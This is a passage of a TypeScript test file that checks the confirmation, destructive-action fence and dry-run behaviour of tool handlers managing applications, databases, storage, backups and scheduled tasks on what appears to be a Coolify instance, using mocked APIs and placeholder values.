    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'destructive_blocked',
    });
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).not.toHaveBeenCalled();
  });

  it('update_resource: confirmation_required when allowDestructive=true but no confirm', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('update_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', fields: { name: 'renamed' } },
      ctx,
    );
    expect(result.status).toBe('error');
    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'confirmation_required',
    });
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).not.toHaveBeenCalled();
  });

  it('update_resource: dry_run returns a preview naming the fields without calling the API', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('update_resource');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        fields: { name: 'renamed', ports_exposes: '8080' },
        dry_run: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.dry_run).toBe(true);
    expect((r.preview as Record<string, unknown>).fields).toEqual(['name', 'ports_exposes']);
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).not.toHaveBeenCalled();
  });

  it('returns invalid_input without calling the API when no updatable fields are provided', async () => {
    const ctx = makeCtx();
    const tool = findTool('update_resource');

    for (const args of [
      { type: 'applications', uuid: 'abc123' },
      { type: 'applications', uuid: 'abc123', fields: {} },
    ]) {
      const result = await tool.handler(args, ctx);
      expect(result.status).toBe('error');
      const r = result as Record<string, unknown>;
      expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
    }
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).not.toHaveBeenCalled();
  });

  it('returns invalid_input when `fields` is not a plain object', async () => {
    const ctx = makeCtx();
    const tool = findTool('update_resource');

    for (const fields of ['not-an-object', 42, ['a'], null]) {
      const result = await tool.handler({ type: 'applications', uuid: 'abc123', fields }, ctx);
      expect(result.status).toBe('error');
      const r = result as Record<string, unknown>;
      expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
    }
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).not.toHaveBeenCalled();
  });

  it('declares `fields`, `fields_json`, `confirm`, and `dry_run` in the input schema', () => {
    const tool = findTool('update_resource');
    const schema = tool.inputSchema as {
      properties?: Record<string, { type?: string; additionalProperties?: boolean }>;
    };
    const fields = schema.properties?.fields;
    expect(fields).toBeDefined();
    expect(fields?.type).toBe('object');
    expect(fields?.additionalProperties).toBe(true);
    expect(schema.properties?.fields_json?.type).toBe('string');
    expect(schema.properties?.confirm?.type).toBe('boolean');
    expect(schema.properties?.dry_run?.type).toBe('boolean');
  });

  it('returns invalid_input for unknown type', async () => {
    const ctx = makeCtx();
    const tool = findTool('update_resource');
    const result = await tool.handler({ type: 'unknown', uuid: 'abc123', name: 'x' }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('returns invalid_input for invalid uuid', async () => {
    const ctx = makeCtx();
    const tool = findTool('update_resource');
    const result = await tool.handler({ type: 'applications', uuid: 'bad uuid!', name: 'x' }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });
});

describe('control_resource', () => {
  it('starts an application and returns deployment_uuid when present', async () => {
    const ctx = makeCtx();
    const controlResult = { message: 'Application started.', deployment_uuid: 'deploy123' };
    (ctx.api.applications.control as ReturnType<typeof vi.fn>).mockResolvedValueOnce(controlResult);

    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'start' },
      ctx,
    );

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.message).toBe('Application started.');
    expect(r.deployment_uuid).toBe('deploy123');
  });

  it('restarts an application — blocked without --allow-destructive', async () => {
    const ctx = makeCtx(); // allowDestructive: false
    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'restart', confirm: true },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('destructive_blocked');
  });

  it('restarts an application — blocked without confirm', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'restart' },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('confirmation_required');
  });

  it('restarts an application and returns deployment_uuid when allowed + confirmed', async () => {
    const ctx = makeDestructiveCtx();
    const controlResult = { message: 'Application restarting.', deployment_uuid: 'deploy456' };
    (ctx.api.applications.control as ReturnType<typeof vi.fn>).mockResolvedValueOnce(controlResult);

    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'restart', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.deployment_uuid).toBe('deploy456');
  });

  it('stops an application — blocked without --allow-destructive', async () => {
    const ctx = makeCtx(); // allowDestructive: false
    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'stop', confirm: true },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('destructive_blocked');
  });

  it('stops an application — blocked without confirm', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'stop' },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('confirmation_required');
  });

  it('dry-runs stop — returns preview without calling control', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'stop', dry_run: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.dry_run).toBe(true);
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.control).not.toHaveBeenCalled();
  });

  it('stops an application when allowed + confirmed — no deployment_uuid in envelope', async () => {
    const ctx = makeDestructiveCtx();
    const controlResult = { message: 'Application stopped.' };
    (ctx.api.applications.control as ReturnType<typeof vi.fn>).mockResolvedValueOnce(controlResult);

    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'stop', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.message).toBe('Application stopped.');
    expect(r.deployment_uuid).toBeUndefined();
  });

  it('starts a database (no deployment_uuid returned, start is unfenced)', async () => {
    const ctx = makeCtx(); // no allowDestructive needed for start
    const controlResult = { message: 'Database started.' };
    (ctx.api.databases.control as ReturnType<typeof vi.fn>).mockResolvedValueOnce(controlResult);

    const tool = findTool('control_resource');
    const result = await tool.handler({ type: 'databases', uuid: 'def456', action: 'start' }, ctx);

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.message).toBe('Database started.');
    expect(r.deployment_uuid).toBeUndefined();
  });

  it('stops a service when allowed + confirmed', async () => {
    const ctx = makeDestructiveCtx();
    const controlResult = { message: 'Service stopped.' };
    (ctx.api.services.control as ReturnType<typeof vi.fn>).mockResolvedValueOnce(controlResult);

    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'services', uuid: 'ghi789', action: 'stop', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.message).toBe('Service stopped.');
  });

  it('returns invalid_input for invalid action', async () => {
    const ctx = makeCtx();
    const tool = findTool('control_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'nuke' },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('returns invalid_input for unknown type', async () => {
    const ctx = makeCtx();
    const tool = findTool('control_resource');
    const result = await tool.handler({ type: 'unknown', uuid: 'abc123', action: 'start' }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('passes instant_deploy option to application control', async () => {
    const ctx = makeCtx();
    (ctx.api.applications.control as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      message: 'Started.',
      deployment_uuid: 'd1',
    });

    const tool = findTool('control_resource');
    await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'start', instant_deploy: true },
      ctx,
    );

    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.control).toHaveBeenCalledWith('abc123', 'start', {
      instant_deploy: true,
    });
  });
});

// Helper to build ctx with allowDestructive for destructive tests
function makeDestructiveCtx(): ToolContext {
  return {
    api: {
      resources: vi.fn<(...args: any[]) => any>(),
      applications: {
        get: vi.fn<(...args: any[]) => any>(),
        delete: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
        listStorages: vi.fn<(...args: any[]) => any>(),
        createStorage: vi.fn<(...args: any[]) => any>(),
        updateStorage: vi.fn<(...args: any[]) => any>(),
        deleteStorage: vi.fn<(...args: any[]) => any>(),
        listScheduledTasks: vi.fn<(...args: any[]) => any>(),
        createScheduledTask: vi.fn<(...args: any[]) => any>(),
        updateScheduledTask: vi.fn<(...args: any[]) => any>(),
        deleteScheduledTask: vi.fn<(...args: any[]) => any>(),
        scheduledTaskExecutions: vi.fn<(...args: any[]) => any>(),
        deletePreview: vi.fn<(...args: any[]) => any>(),
      },
      databases: {
        get: vi.fn<(...args: any[]) => any>(),
        delete: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
        listStorages: vi.fn<(...args: any[]) => any>(),
        createStorage: vi.fn<(...args: any[]) => any>(),
        updateStorage: vi.fn<(...args: any[]) => any>(),
        deleteStorage: vi.fn<(...args: any[]) => any>(),
        listBackups: vi.fn<(...args: any[]) => any>(),
        createBackup: vi.fn<(...args: any[]) => any>(),
        updateBackup: vi.fn<(...args: any[]) => any>(),
        deleteBackup: vi.fn<(...args: any[]) => any>(),
        backupExecutions: vi.fn<(...args: any[]) => any>(),
        deleteBackupExecution: vi.fn<(...args: any[]) => any>(),
      },
      services: {
        get: vi.fn<(...args: any[]) => any>(),
        delete: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
        listStorages: vi.fn<(...args: any[]) => any>(),
        createStorage: vi.fn<(...args: any[]) => any>(),
        updateStorage: vi.fn<(...args: any[]) => any>(),
        deleteStorage: vi.fn<(...args: any[]) => any>(),
        listScheduledTasks: vi.fn<(...args: any[]) => any>(),
        createScheduledTask: vi.fn<(...args: any[]) => any>(),
        updateScheduledTask: vi.fn<(...args: any[]) => any>(),
        deleteScheduledTask: vi.fn<(...args: any[]) => any>(),
        scheduledTaskExecutions: vi.fn<(...args: any[]) => any>(),
      },
    } as unknown as ToolContext['api'],
    config: {
      name: 'default',
      baseUrl: 'http://coolify.test',
      token: '1|secret',
      extraHeaders: {},
      enableHostOps: false,
      allowDestructive: true,
    } as InstanceConfig,
    hostOps: async () => {
      throw new Error('no host ops');
    },
    resolver: {} as ToolContext['resolver'],
  } as ToolContext;
}

describe('delete_resource', () => {
  it('blocks when allowDestructive is false', async () => {
    const ctx = makeCtx(); // allowDestructive: false
    const tool = findTool('delete_resource');
    const result = await tool.handler({ type: 'applications', uuid: 'abc123', confirm: true }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('destructive_blocked');
  });

  it('blocks when confirm is not true', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('delete_resource');
    const result = await tool.handler({ type: 'applications', uuid: 'abc123' }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('confirmation_required');
  });

  it('returns dry_run preview without calling delete', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('delete_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', confirm: true, dry_run: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(r.dry_run).toBe(true);
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.delete).not.toHaveBeenCalled();
  });

  it('deletes an application when confirmed and allowed', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.delete as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      message: 'Application deleted.',
    });

    const tool = findTool('delete_resource');
    const result = await tool.handler({ type: 'applications', uuid: 'abc123', confirm: true }, ctx);

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).message).toBe('Application deleted.');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.delete).toHaveBeenCalledWith('abc123');
  });

  it('deletes a database when confirmed and allowed', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.databases.delete as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      message: 'Database deleted.',
    });

    const tool = findTool('delete_resource');
    const result = await tool.handler({ type: 'databases', uuid: 'def456', confirm: true }, ctx);

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).message).toBe('Database deleted.');
  });

  it('deletes a service when confirmed and allowed', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.services.delete as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      message: 'Service deleted.',
    });

    const tool = findTool('delete_resource');
    const result = await tool.handler({ type: 'services', uuid: 'ghi789', confirm: true }, ctx);

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).message).toBe('Service deleted.');
  });

  it('returns invalid_input for unknown type', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('delete_resource');
    const result = await tool.handler({ type: 'unknown', uuid: 'abc123', confirm: true }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });
});

describe('manage_storage', () => {
  it('lists storages for an application', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.listStorages as ReturnType<typeof vi.fn>).mockResolvedValueOnce([
      { uuid: 'st1', name: 'vol1' },
    ]);

    const tool = findTool('manage_storage');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'list' },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect(Array.isArray((result as Record<string, unknown>).storages)).toBe(true);
  });

  it('creates storage for an application', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.createStorage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'st2',
    });

    const tool = findTool('manage_storage');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'create',
        name: 'myvolume',
        host_path: '/data/vol',
      },
      ctx,
    );

    expect(result.status).toBe('ok');
  });

  it('creates storage from the declared `fields` object', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.createStorage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'st4',
    });

    const tool = findTool('manage_storage');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'create',
        fields: { name: 'myvolume', mount_path: '/data', is_directory: true },
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.createStorage).toHaveBeenCalledWith('abc123', {
      name: 'myvolume',
      mount_path: '/data',
      is_directory: true,
    });
  });

  it('updates storage from the declared `fields` object', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.updateStorage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'st1',
    });

    const tool = findTool('manage_storage');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'update',
        storage_uuid: 'st1',
        fields: { mount_path: '/newdata' },
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.updateStorage).toHaveBeenCalledWith('abc123', 'st1', {
      mount_path: '/newdata',
    });
  });

  it('returns invalid_input when create/update has no storage fields', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_storage');

    for (const args of [
      { type: 'applications', uuid: 'abc123', action: 'create' },
      { type: 'applications', uuid: 'abc123', action: 'update', storage_uuid: 'st1', fields: {} },
    ]) {
      const result = await tool.handler(args, ctx);
      expect(result.status).toBe('error');
      expect(((result as Record<string, unknown>).error as Record<string, unknown>).kind).toBe(
        'invalid_input',
      );
    }
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.createStorage).not.toHaveBeenCalled();
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.updateStorage).not.toHaveBeenCalled();
  });

  it('declares `fields` and `fields_json` in the manage_storage input schema', () => {
    const tool = findTool('manage_storage');
    const schema = tool.inputSchema as {
      properties?: Record<string, { type?: string; additionalProperties?: boolean }>;
    };
    expect(schema.properties?.fields?.type).toBe('object');
    expect(schema.properties?.fields?.additionalProperties).toBe(true);
    expect(schema.properties?.fields_json?.type).toBe('string');
  });

  it('blocks delete-storage without confirm when allowDestructive=true', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_storage');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'delete', storage_uuid: 'st1' },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('confirmation_required');
  });

  it('deletes storage for an application when confirmed', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.deleteStorage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      message: 'Storage deleted.',
    });

    const tool = findTool('manage_storage');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'delete',
        storage_uuid: 'st1',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.deleteStorage).toHaveBeenCalledWith('abc123', 'st1');
  });

  it('lists storages for a database', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.databases.listStorages as ReturnType<typeof vi.fn>).mockResolvedValueOnce([
      { uuid: 'st3' },
    ]);

    const tool = findTool('manage_storage');
    const result = await tool.handler({ type: 'databases', uuid: 'def456', action: 'list' }, ctx);

    expect(result.status).toBe('ok');
  });

  it('returns invalid_input for unknown action', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_storage');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'invalid_action' },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });
});

describe('manage_backups', () => {
  it('lists backups for a database', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.databases.listBackups as ReturnType<typeof vi.fn>).mockResolvedValueOnce([
      { uuid: 'bk1', status: 'finished' },
    ]);

    const tool = findTool('manage_backups');
    const result = await tool.handler({ uuid: 'def456', action: 'list' }, ctx);

    expect(result.status).toBe('ok');
    expect(Array.isArray((result as Record<string, unknown>).backups)).toBe(true);
  });

  it('creates a backup from the declared `fields` object', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.databases.createBackup as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'bk2',
    });

    const tool = findTool('manage_backups');
    const result = await tool.handler(
      { uuid: 'def456', action: 'create', fields: { frequency: '0 3 * * *', save_s3: false } },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.createBackup).toHaveBeenCalledWith('def456', {
      frequency: '0 3 * * *',
      save_s3: false,
    });
  });

  it('creates a backup from top-level extras (permissive-client path)', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.databases.createBackup as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'bk2',
    });

    const tool = findTool('manage_backups');
    const result = await tool.handler(
      { uuid: 'def456', action: 'create', frequency: '0 3 * * *' },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.createBackup).toHaveBeenCalledWith('def456', {
      frequency: '0 3 * * *',
    });
  });

  it('updates a backup from the declared `fields` object', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.databases.updateBackup as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'bk1',
    });

    const tool = findTool('manage_backups');
    const result = await tool.handler(
      { uuid: 'def456', action: 'update', backup_uuid: 'bk1', fields: { enabled: false } },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.updateBackup).toHaveBeenCalledWith('def456', 'bk1', {
      enabled: false,
    });
  });

  it('returns invalid_input when backup create/update has no fields', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_backups');

    for (const args of [
      { uuid: 'def456', action: 'create' },
      { uuid: 'def456', action: 'update', backup_uuid: 'bk1' },
    ]) {
      const result = await tool.handler(args, ctx);
      expect(result.status).toBe('error');
      expect(((result as Record<string, unknown>).error as Record<string, unknown>).kind).toBe(
        'invalid_input',
      );
    }
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.createBackup).not.toHaveBeenCalled();
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.updateBackup).not.toHaveBeenCalled();
  });

  it('declares `fields` and `fields_json` in the manage_backups input schema', () => {
    const tool = findTool('manage_backups');
    const schema = tool.inputSchema as {
      properties?: Record<string, { type?: string; additionalProperties?: boolean }>;
    };
    expect(schema.properties?.fields?.type).toBe('object');
    expect(schema.properties?.fields?.additionalProperties).toBe(true);
    expect(schema.properties?.fields_json?.type).toBe('string');
  });

  it('blocks delete-backup without confirm', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_backups');
    const result = await tool.handler(
      { uuid: 'def456', action: 'delete', backup_uuid: 'bk1' },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('confirmation_required');
  });

  it('deletes a backup when confirmed', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.databases.deleteBackup as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      message: 'Backup deleted.',
    });

    const tool = findTool('manage_backups');
    const result = await tool.handler(
      { uuid: 'def456', action: 'delete', backup_uuid: 'bk1', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.deleteBackup).toHaveBeenCalledWith('def456', 'bk1');
  });

  it('returns invalid_input for unknown action', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_backups');
    const result = await tool.handler({ uuid: 'def456', action: 'explode' }, ctx);

    expect(result.status).toBe('error');
  });
});

describe('manage_scheduled_tasks', () => {
  it('lists scheduled tasks for an application', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.listScheduledTasks as ReturnType<typeof vi.fn>).mockResolvedValueOnce([
      { uuid: 'task1', name: 'cleanup' },
    ]);

    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'list' },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect(Array.isArray((result as Record<string, unknown>).tasks)).toBe(true);
  });

  it('creates a scheduled task for an application when allowed + confirmed', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.createScheduledTask as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'task2',
    });

    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'create',
        name: 'nightly',
        command: 'npm run cleanup',
        frequency: '0 3 * * *',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.createScheduledTask).toHaveBeenCalledWith(
      'abc123',
      expect.objectContaining({ name: 'nightly', command: 'npm run cleanup' }),
    );
  });

  it('declares container, timeout, and enabled in the input schema and forwards them', async () => {
    const tool = findTool('manage_scheduled_tasks');
    const schema = tool.inputSchema as {
      properties?: Record<string, { type?: string }>;
    };
    expect(schema.properties?.container?.type).toBe('string');
    expect(schema.properties?.timeout?.type).toBe('integer');
    expect(schema.properties?.enabled?.type).toBe('boolean');

    const ctx = makeDestructiveCtx();
    (ctx.api.services.createScheduledTask as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'task3',
    });
    const result = await tool.handler(
      {
        type: 'services',
        uuid: 'svc123',
        action: 'create',
        name: 'prune',
        command: 'docker system prune -f',
        frequency: '0 4 * * *',
        container: 'worker',
        timeout: 600,
        enabled: false,
        confirm: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.services.createScheduledTask).toHaveBeenCalledWith(
      'svc123',
      expect.objectContaining({ container: 'worker', timeout: 600, enabled: false }),
    );
  });

  // H2R2 regression: manage_scheduled_tasks create is fenced
  it('manage_scheduled_tasks create: destructive_blocked when allowDestructive=false', async () => {
    const ctx = makeCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'create',
        name: 'nightly',
        command: 'npm run cleanup',
        frequency: '0 3 * * *',
      },
      ctx,
    );
    expect(result.status).toBe('error');
    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'destructive_blocked',
    });
  });

  it('manage_scheduled_tasks create: confirmation_required when allowDestructive=true but no confirm', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'create',
        name: 'nightly',
        command: 'npm run cleanup',
        frequency: '0 3 * * *',
      },
      ctx,
    );
    expect(result.status).toBe('error');
    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'confirmation_required',
    });
  });

  it('manage_scheduled_tasks create: dry_run returns preview without calling API', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'create',
        name: 'nightly',
        command: 'npm run cleanup',
        frequency: '0 3 * * *',
        dry_run: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).dry_run).toBe(true);
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.createScheduledTask).not.toHaveBeenCalled();
  });

  // H2R2 regression: manage_scheduled_tasks update is fenced
  it('manage_scheduled_tasks update: destructive_blocked when allowDestructive=false', async () => {
    const ctx = makeCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'update',
        task_uuid: 'task1',
        name: 'updated',
      },
      ctx,
    );
    expect(result.status).toBe('error');
    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'destructive_blocked',
    });
  });

  it('manage_scheduled_tasks update: confirmation_required when allowDestructive=true but no confirm', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'update',
        task_uuid: 'task1',
        name: 'updated',
      },
      ctx,
    );
    expect(result.status).toBe('error');
    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'confirmation_required',
    });
  });

  it('manage_scheduled_tasks update: dry_run returns preview without calling API', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'update',
        task_uuid: 'task1',
        name: 'updated',
        dry_run: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).dry_run).toBe(true);
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.updateScheduledTask).not.toHaveBeenCalled();
  });

  it('manage_scheduled_tasks update: succeeds with allowDestructive=true and confirm=true', async () => {
    const ctx = makeDestructiveCtx();
